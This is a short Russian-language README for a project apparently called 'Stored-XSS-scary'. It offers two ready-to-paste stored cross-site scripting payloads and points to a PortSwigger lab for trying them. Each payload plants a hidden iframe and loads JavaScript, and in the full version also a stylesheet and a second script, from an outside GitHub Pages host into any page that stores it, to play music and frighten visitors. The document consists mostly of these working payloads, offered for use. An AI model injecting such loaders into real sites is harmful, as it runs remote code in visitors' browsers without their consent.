# Stored-XSS-scary

Код сработает только при наличии уязвимости stored XSS + сайт не будет блокировать загрузку внешних скриптов и стилей. <br>
Для теста можно запустить лабараторку в https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded.

------------------------------------------

Полная версия (музыка + CSS + доп. JS скрипты) [540 символов]:
> <script>var f=document.createElement("iframe");f.style.display="none";document.body.appendChild(f);f.onload=function(){var s=document.createElement('script');s.src='https://0-dayff13r.github.io/Stored-XSS-scary/start.js';f.contentWindow.document.head.appendChild(s);var c=document.createElement('link');c.rel='stylesheet';c.href='https://0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='https://0-dayff13r.github.io/Stored-XSS-scary/script.js';document.body.appendChild(r)}</script>

<br> Сокращенная версия (только музыка) [269 символов]:
> <script>var f=document.createElement("iframe");f.style.display="none";document.body.appendChild(f);f.onload=function(){var s=document.createElement('script');s.src='//0-dayff13r.github.io/Stored-XSS-scary/start.js';f.contentWindow.document.head.appendChild(s)}</script>
